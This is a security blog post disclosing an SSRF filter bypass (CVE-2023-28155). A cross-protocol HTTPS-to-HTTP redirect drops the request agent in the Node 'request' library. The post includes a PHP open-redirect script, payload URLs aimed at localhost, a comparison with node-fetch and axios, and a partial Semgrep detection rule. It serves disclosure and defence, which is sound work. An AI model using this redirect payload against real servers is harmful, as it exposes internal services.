---
title: SSRF Cross Protocol Redirect Bypass
url: https://blog.doyensec.com//2023/03/16/ssrf-remediation-bypass.html
source: Over Security - Cybersecurity news aggregator
date: 2023-03-17
fetch_date: 2025-10-04T09:52:52.314100
---

# SSRF Cross Protocol Redirect Bypass

[

](https://doyensec.com/img/home-video.mp4)

[![](/public/images/doyensec-logo.svg)](/index.html)

[![](/public/images/logo.svg)](/index.html)

#### ABOUT US

We are [**security engineers**](https://doyensec.com) who break bits and tell stories.

Visit us
[doyensec.com](https://doyensec.com)

Follow us
[@doyensec](https://twitter.com/doyensec)

Engage us
info@doyensec.com

#### Blog Archive

* 2025
* 2024
* 2023
* 2022
* 2021
* 2020
* 2019
* 2018
* 2017

© 2025 [Doyensec LLC](https://doyensec.com) [![](/public/images/rss.png)](/atom.xml "RSS")

# SSRF Cross Protocol Redirect Bypass

16 Mar 2023 - Posted by Szymon Drosdzol

Server Side Request Forgery (SSRF) is a [fairly known vulnerability](https://portswigger.net/web-security/ssrf) with established prevention methods. So imagine my surprise when I bypassed an SSRF mitigation during a routine retest. Even worse, **I have bypassed a filter that we have recommended ourselves**! I couldnât let it slip and had to get to the bottom of the issue.

# Introduction

Server Side Request Forgery is a vulnerability in which a malicious actor exploits a victim server to perform HTTP(S) requests on the attackerâs behalf. Since the server usually has access to the internal network, this attack is useful to bypass firewalls and IP whitelists to access hosts otherwise inaccessible to the attacker.

# Request Library Vulnerability

SSRF attacks can be prevented with address filtering, assuming there are no filter bypasses. One of the classic SSRF filtering bypass techniques is a redirection attack. In these attacks, an attacker sets up a malicious webserver serving an endpoint redirecting to an internal address. The victim server properly allows sending a request to an external server, but then blindly follows a malicious redirection to an internal service.

None of above is new, of course. All of these techniques have been around for years and any reputable anti-SSRF library mitigates such risks. And yet, I have bypassed it.

Clientâs code was a simple endpoint created for integration. During the original engagement there was no filtering at all. After our test the client has applied an anti-SSRF library [ssrfFilter](https://www.npmjs.com/package/ssrf-req-filter). For the research and code anonymity purposes, I have extracted the logic to a standalone NodeJS script:

```
const request = require('request');
const ssrfFilter = require('ssrf-req-filter');

let url = process.argv[2];
console.log("Testing", url);

request({
    uri: url,
    agent: ssrfFilter(url),
}, function (error, response, body) {
    console.error('error:', error);
    console.log('statusCode:', response && response.statusCode);
});
```

To verify a redirect bypasss I have created a simple webserver with an open-redirect endpoint in PHP and hosted it on the Internet using my test domain `tellico.fun`:

```
<?php header('Location: '.$_GET["target"]); ?>
```

Initial test demonstrates that the vulnerability is fixed:

```
$ node test-request.js "http://tellico.fun/redirect.php?target=http://localhost/test"
Testing http://tellico.fun/redirect.php?target=http://localhost/test
error: Error: Call to 127.0.0.1 is blocked.
```

But then, I switched the protocol and suddenly I was able to access a localhost service again. Readers should look carefully at the payload, as the difference is minimal:

```
$ node test-request.js "https://tellico.fun/redirect.php?target=http://localhost/test"
Testing https://tellico.fun/redirect.php?target=http://localhost/test
error: null
statusCode: 200
```

What happened? The attacker server has redirected the request to another protocol - from HTTPS to HTTP. This is all it took to bypass the anti-SSRF protection.

Why is that? After some digging in the popular [request](https://www.npmjs.com/package/request) library codebase, I have discovered the following lines in the `lib/redirect.js` file:

```
  // handle the case where we change protocol from https to http or vice versa
if (request.uri.protocol !== uriPrev.protocol) {
  delete request.agent
}
```

According to the code above, anytime the redirect causes a protocol switch, the request agent is deleted. Without this workaround, the client would fail anytime a server would cause a cross-protocol redirect. This is needed since the native NodeJs `http(s).agent` cannot be used with both protocols.

Unfortunately, such behavior also loses any event handling associated with the agent. Given, that the SSRF prevention is based on the agentsâ `createConnection` event handler, this unexpected behavior affects the effectiveness of SSRF mitigation strategies in the `request` library.

## Disclosure

This issue was disclosed to the maintainers on December 5th, 2022. Despite our best attempts, we have not yet received an acknowledgment. After the 90-days mark, we have decided to publish the [full technical details](https://doyensec.com/resources/Doyensec_Advisory_RequestSSRF_Q12023.pdf) as well as a public Github [issue](https://github.com/request/request/issues/3442) linked to a [pull request](https://github.com/request/request/pull/3444) for the fix. On March 14th, 2023, a CVE ID has been assigned to this vulnerability.

* 12/05/2022 - First disclosure to the maintainer
* 01/18/2023 - Another attempt to contact the maintainer
* 03/08/2023 - A [Github issue](https://github.com/request/request/issues/3442) creation, without the technical details
* 03/13/2023 - CVE-2023-28155 assigned
* 03/16/2023 - Full technical details disclosure

# Other Libraries

Since supposedly universal filter turned out to be so dependent on the implementation of the HTTP(S) clients, it is natural to ask how other popular libraries handle these cases.

## Node-Fetch

The `node-Fetch` library also allows to overwrite an HTTP(S) agent within its options, without specifying the protocol:

```
const ssrfFilter = require('ssrf-req-filter');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));

let url = process.argv[2];
console.log("Testing", url);

fetch(url, {
    agent: ssrfFilter(url)
}).then((response) => {
    console.log('Success');
}).catch(error => {
    console.log('${error.toString().split('\n')[0]}');
});
```

Contrary to the `request` library though, it simply fails in the case of a cross-protocol redirect:

```
$ node fetch.js "https://tellico.fun/redirect.php?target=http://localhost/test"
Testing https://tellico.fun/redirect.php?target=http://localhost/test
TypeError [ERR_INVALID_PROTOCOL]: Protocol "http:" not supported. Expected "https:"
```

It is therefore impossible to perform a similar attack on this library.

## Axios

The `axios` libraryâs options allow to overwrite agents for both protocols separately. Therefore the following code is protected:

```
axios.get(url, {
    httpAgent: ssrfFilter("http://domain"),
    httpsAgent: ssrfFilter("https://domain")
})
```

**Note:** In Axios library, it is neccesary to hardcode the urls during the agent overwrite. Otherwise, one of the agents would be overwritten with an agent for a wrong protocol and the cross-protocol redirect would fail similarly to the `node-fetch` library.

Still, `axios` calls can be vulnerable. If one forgets to overwrite both agents, the cross-protocol redirect can bypass the filter:

```
axios.get(url, {
    // httpAgent: ssrfFilter(url),
    httpsAgent: ssrfFilter(url)
})
```

Such misconfigurations can be easily missed, so we have created a [Semgrep](https://semgrep.dev/) rule that catches similar patterns in JavaScript code:

```
rules:
  - id: axios-only-one-agent-set
    message: Detected an Axios call that overwrites only one HTTP(S) agent. It can lead to a bypass of restriction implemented in the agent implementation. For example SSRF protection can be bypassed by a malicious server redirecting the client from HTTPS to HTTP (or the other way around).
    mode: taint
    pattern-sources:
      - patterns:
        - pattern-either:
            - pattern: |
             ...